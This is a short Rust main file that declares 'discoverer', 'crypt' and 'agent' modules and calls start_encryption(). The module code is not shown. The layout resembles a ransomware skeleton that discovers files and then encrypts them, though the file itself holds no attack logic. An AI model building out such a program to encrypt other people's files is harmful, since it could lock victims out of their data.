mod discoverer;
mod crypt;
mod agent;

use agent::start_encryption;

fn main() {
    start_encryption();
}
